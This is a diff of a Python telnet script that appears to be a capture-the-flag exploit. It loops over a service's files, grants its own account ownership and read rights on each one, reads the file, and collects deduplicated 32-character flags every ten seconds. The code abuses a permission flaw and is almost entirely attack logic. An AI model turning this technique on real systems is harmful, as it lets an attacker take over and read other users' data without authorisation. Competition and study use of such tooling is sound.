@@ -72,24 +72,28 @@ if __name__ == "__main__":
     if not authorize(tn, username, password):
         print("nu i huita")
         exit()
+    old_flags = []
     while(True):
         tn.write(b"sft\n")
-        strin = tn.read_until(b"]\n\nEnter your request")
+        _,_,strin = tn.expect([b"]\n\nEnter your request"],5)
         names = strin.decode().split("', '")
         names[0] = names[0].split("['")[1]
         names[-1] = names[-1].split("'")[0]
-        names = [filename for filename in names if len(filename)==8]
-        print(names)
+        names = [filename for filename in names if len(filename)==16]
+        #print(names)
         for name in names:
             tn.write(b"give own " + name.encode() + b" " + username.encode() + b"\n")
             tn.expect([b"DONE!"],5)
             tn.write(b"give read " + name.encode() + b" " + username.encode() + b"\n")
             tn.expect([b"DONE!"],5)
             tn.write(b"read " + name.encode() + b"\n")
-            pre_flag = tn.read_until(b"____________________\n\nEnter your request")
+            _,_,pre_flag = tn.expect([b"____________________\n\nEnter your request"],5)
             pre_flag = pre_flag.decode()
             #print(pre_flag)
             flag = pre_flag.split("____________________\n")[1][:-1]
-            print(f"here are flags: {flag}")
+            if len(flag) == 32:
+                if flag not in old_flags:
+                    old_flags.append(flag)
+                    print(f"here are flags: {flag}")
         print("i sleep, bro")
         sleep(10)
